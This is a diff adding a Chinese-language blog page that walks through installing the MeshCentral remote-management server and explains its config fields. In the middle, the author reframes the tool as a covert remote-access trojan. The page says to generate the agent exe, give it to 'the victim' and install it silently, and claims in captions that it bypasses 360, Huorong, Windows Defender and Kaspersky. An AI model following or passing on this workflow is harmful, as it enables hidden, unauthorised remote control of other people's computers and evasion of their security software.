@@ -1,0 +1,430 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="0ldcat">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="github GitHub - Ylianst&#x2F;MeshCentral: A complete web-based remote monitoring and management web site. Once setup you can install agents and perform remote desktop session to devices on the local n">
+<meta property="og:type" content="article">
+<meta property="og:title" content="meshcentral工具安装使用">
+<meta property="og:url" content="http://example.com/2026/07/16/meshcentral%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/index.html">
+<meta property="og:site_name" content="0ldcat_blog">
+<meta property="og:description" content="github GitHub - Ylianst&#x2F;MeshCentral: A complete web-based remote monitoring and management web site. Once setup you can install agents and perform remote desktop session to devices on the local n">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2026/07/16/meshcentral%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/2026-07-16-15-00-07-image.png">
+<meta property="og:image" content="http://example.com/2026/07/16/meshcentral%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/2026-07-16-15-00-48-image.png">
+<meta property="og:image" content="http://example.com/2026/07/16/meshcentral%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/2026-07-16-15-02-10-image.png">
+<meta property="og:image" content="http://example.com/2026/07/16/meshcentral%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/2026-07-16-15-12-18-image.png">
+<meta property="og:image" content="http://example.com/2026/07/16/meshcentral%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/2026-07-16-15-20-15-image.png">
+<meta property="og:image" content="http://example.com/2026/07/16/meshcentral%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/2026-07-16-15-51-44-image.png">
+<meta property="og:image" content="http://example.com/2026/07/16/meshcentral%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/2026-07-16-17-08-53-image.png">
+<meta property="article:published_time" content="2026-07-16T06:56:13.000Z">
+<meta property="article:modified_time" content="2026-07-16T09:08:53.991Z">
+<meta property="article:author" content="0ldcat">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2026/07/16/meshcentral%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/2026-07-16-15-00-07-image.png">
+  
+  
+  <title>meshcentral工具安装使用 - 0ldcat_blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.13","typing":{"enable":true,"typeSpeed":70,"cursorChar":"...","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>闲言碎语</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="meshcentral工具安装使用">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2026-07-16 14:56" pubdate>
+        2026年7月16日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      4k 个字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      34 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">meshcentral工具安装使用</h1>
+            
+            <div class="markdown-body">
+              <p>github</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Ylianst/MeshCentral">GitHub - Ylianst&#x2F;MeshCentral: A complete web-based remote monitoring and management web site. Once setup you can install agents and perform remote desktop session to devices on the local network or over the Internet. · GitHub</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">mkdir -p ~/meshcentral/data ~/meshcentral/user_files<br><br>cd ~/meshcentral/<br><br>curl -fsSL https://deb.nodesource.com/setup_lts.x | sudo -E bash -<br><br>sudo apt-get install -y nodejs<br><br>npm install meshcentral<br></code></pre></div></td></tr></table></figure>
+
+<p>config:</p>
+<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">root@oooobc:/home/zhh/meshcentral/meshcentral-data# cat config.json<br>&#123;<br>  &quot;$schema&quot;: &quot;https://raw.githubusercontent.com/Ylianst/MeshCentral/master/meshcentral-config-schema.json&quot;,<br>  &quot;settings&quot;: &#123;<br>    &quot;cert&quot;: &quot;192.168.55.19&quot;,<br>    &quot;agentAliasDNS&quot;: &quot;192.168.55.19&quot;,<br>    &quot;LANonly&quot;: true,<br>    &quot;port&quot;: 443,<br>    &quot;redirPort&quot;: 80,<br>    &quot;AgentPong&quot;: 300,<br>    &quot;TLSOffload&quot;: false<br>  &#125;,<br>  &quot;domains&quot;: &#123;<br>    &quot;&quot;: &#123;<br>      &quot;title&quot;: &quot;MyServer&quot;,<br>      &quot;title2&quot;: &quot;LAN&quot;,<br>      &quot;newAccounts&quot;: true,<br>      &quot;minify&quot;: true<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+
+<p><img src="/2026/07/16/meshcentral%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/2026-07-16-15-00-07-image.png" srcset="/img/loading.gif" lazyload></p>
+<p>node node_modules&#x2F;meshcentral</p>
+<p>记住，使用root权限运行或者开放端口运行，这里使用root权限</p>
+<p><img src="/2026/07/16/meshcentral%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/2026-07-16-15-00-48-image.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后访问ip，查看后台， 添加一个设备组，组需要设置为代理，然后在此组中下载代理的exe文件，完成后给受害者，使用静默安装，目前360无法绕过</p>
+<p><img src="/2026/07/16/meshcentral%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/2026-07-16-15-02-10-image.png" srcset="/img/loading.gif" lazyload></p>
+<p>命令行静默安装 -fullinstall</p>
+<p>其他agent的指令</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs livecodeserver">C:\Users\Administrator\Desktop&gt;meshagent64-test.exe -h<br>Mesh Agent available switches:<br>  run               Start <span class="hljs-keyword">as</span> <span class="hljs-keyword">a</span> console agent.<br>  connect           Start <span class="hljs-keyword">as</span> <span class="hljs-keyword">a</span> temporary console agent.<br>  <span class="hljs-built_in">start</span>             Start <span class="hljs-keyword">the</span> service.<br>  restart           Restart <span class="hljs-keyword">the</span> service.<br>  <span class="hljs-built_in">stop</span>              Stop <span class="hljs-keyword">the</span> service.<br>  state             Display <span class="hljs-keyword">the</span> running state <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> service.<br>  -signcheck        Perform self - check.<br>  -install          Install <span class="hljs-keyword">the</span> service <span class="hljs-built_in">from</span> this location.<br>  -uninstall        Remove <span class="hljs-keyword">the</span> service <span class="hljs-built_in">from</span> this location.<br>  -nodeid           Return <span class="hljs-keyword">the</span> current agent identifier.<br>  -info             Return agent <span class="hljs-built_in">version</span> information.<br>  -resetnodeid      Reset <span class="hljs-keyword">the</span> NodeID next <span class="hljs-built_in">time</span> <span class="hljs-keyword">the</span> service is started.<br>  -fulluninstall    Stop agent <span class="hljs-keyword">and</span> clean up <span class="hljs-keyword">the</span> program <span class="hljs-built_in">files</span> location.<br>  -fullinstall      Copy agent <span class="hljs-keyword">into</span> program <span class="hljs-built_in">files</span>, install <span class="hljs-keyword">and</span> launch.<br><br>                    The following switches can be specified <span class="hljs-keyword">after</span> -fullinstall:<br><br>     <span class="hljs-comment">--WebProxy=&quot;http://proxyhost:port&quot;      Specify an HTTPS proxy.</span><br>     <span class="hljs-comment">--agentName=&quot;alternate name&quot;            Specify an alternate name to be provided by the agent.</span><br></code></pre></div></td></tr></table></figure>
+
+<p>直接绕过火绒</p>
+<p><img src="/2026/07/16/meshcentral%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/2026-07-16-15-12-18-image.png" srcset="/img/loading.gif" lazyload></p>
+<p>绕过windows defender</p>
+<p><img src="/2026/07/16/meshcentral%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/2026-07-16-15-20-15-image.png" srcset="/img/loading.gif" lazyload></p>
+<p>Linux（需要sudo权限，因为该程序涉及系统底层驱动）</p>
+<p><img src="/2026/07/16/meshcentral%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/2026-07-16-15-51-44-image.png" srcset="/img/loading.gif" lazyload></p>
+<p>绕过卡巴斯基：</p>
+<p><img src="/2026/07/16/meshcentral%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/2026-07-16-17-08-53-image.png" srcset="/img/loading.gif" lazyload></p>
+<p>……</p>
+<p>config配置介绍</p>
+<figure class="highlight maxima"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs maxima">一、settings（服务器全局设置，最常用）<br>这是最核心的一块，控制服务器怎么监听、用什么证书、什么模式。<br><br>cert：服务器的证书主机名，agent 和浏览器用它识别服务器。填域名（如 <span class="hljs-built_in">mesh</span>.<span class="hljs-built_in">example</span>.com）或内网 IP（如 <span class="hljs-number">192.168</span><span class="hljs-number">.55</span><span class="hljs-number">.19</span>）。这是你一直在改的字段。<br><br>agentAliasDNS：告诉 agent 回连时用哪个域名/IP。公网部署时填公网域名。这决定了 agent 里嵌入的 Server URL。<br><br>agentAliasPort：agent 回连用的端口别名，反向代理或端口映射时用。<br><br>port：MeshCentral 的 HTTPS 主端口，默认 <span class="hljs-number">443</span>。反向代理时改成内部端口（如 <span class="hljs-number">4430</span>）。<br><br>aliasPort：对外真实端口。当实际端口和对外端口不一致时（如反代、端口映射）用它告诉 MeshCentral 对外是多少。<br><br>redirPort：HTTP 重定向端口，默认 <span class="hljs-number">80</span>，用来把 http 请求跳转到 https。设为 <span class="hljs-number">0</span> 可关闭。<br><br>LANonly：仅局域网模式，靠多播自动发现。设 <span class="hljs-literal">true</span> 会让 Server URL 显示 <span class="hljs-built_in">local</span>（你之前踩的坑）。<br><br>WANonly：仅广域网模式，公网部署时可用，agent 只用固定地址连接。<br><br>TLSOffload：TLS 卸载。放在反向代理后面时设为代理地址或 <span class="hljs-literal">true</span>，表示 TLS 由前面的代理处理，MeshCentral 收到的是明文 HTTP。<br><br>AgentPong / AgentPing：agent 心跳间隔（秒），保持长连接、检测在线状态。<br><br>MongoDb：MongoDB 连接字符串。不填则用内置 NeDB 文件数据库；大规模部署改用 MongoDB。<br><br>sessionKey：会话加密密钥，建议手动设一个固定的强随机串，否则重启后所有登录会话失效。<br><br>maxInvalidLogin：限制登录失败次数，防暴力破解。可设尝试次数、锁定时间等，公网部署强烈建议开。<br><br>selfUpdate：是否允许服务器自我更新。<br><br>二、domains（域配置，支持多租户）<br>domains 下每个键是一个域，<span class="hljs-string">&quot;&quot;</span>（空字符串）是默认域。同一台服务器可配多个域实现多租户隔离。常用子字段：<br><br><span class="hljs-built_in">title</span> / title2：网页左上角显示的标题和副标题。<br><br>newAccounts：是否允许公开注册新账号。公网部署务必设 <span class="hljs-literal">false</span>，否则任何人都能注册。<br><br>minify：压缩网页资源，加快加载，生产环境建议 <span class="hljs-literal">true</span>。<br><br>certUrl：指定外部证书来源地址，通常用在反向代理场景。你之前误用它导致过 <span class="hljs-string">&quot;Failed to load web certificate&quot;</span> 报错——不用反代就别填。<br><br>userQuota / meshQuota：用户和设备组的存储配额。<br><br>auth：认证方式，如 LDAP、SSPI（Windows 域认证）等。<br><br>ldap / authStrategies：对接 LDAP、OAuth、SAML 等外部身份认证。<br><br>twoFactorCookieDurationDays：2FA 记住设备的天数。<br><br>passwordRequirements：密码强度要求（最小长度、是否要大小写数字等）。<br><br>agentInviteCodes：agent 安装邀请码。<br><br>limitedEvents、hide 等：控制界面元素显示/隐藏。<br><br>三、letsencrypt（自动 HTTPS 证书）<br>公网部署配合域名时用来自动签发 Let&#x27;s Encrypt 免费证书：<br><br>email：接收证书通知的邮箱（必填）。<br><br>names：要申请证书的域名。<br><br>production：<span class="hljs-literal">true</span> 为正式证书，<span class="hljs-literal">false</span> 为测试证书（调试时先用 <span class="hljs-literal">false</span> 避免触发频率限制）。<br><br>四、smtp / sendgrid（邮件服务）<br>用于发送账户验证、密码重置、告警邮件。smtp 下填 host、port、user、pass、from 等；也可用 SendGrid 等第三方。没有邮件需求可不配。<br><br>五、其他常见块<br>peers：多服务器集群/负载均衡配置。<br><br>webrtc：是否启用 WebRTC 点对点，降低服务器中继负担。<br><br>plugins：插件系统开关。<br><br>db 相关：数据库加密、备份设置，如 dbEncryptKey（数据库加密密钥）。<br></code></pre></div></td></tr></table></figure>
+
+<p>更多参数：<a target="_blank" rel="noopener" href="https://docs.meshcentral.com/meshcentral/">https://docs.meshcentral.com/meshcentral/</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+              </div>
+              
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+    
+
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+        typing(title);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
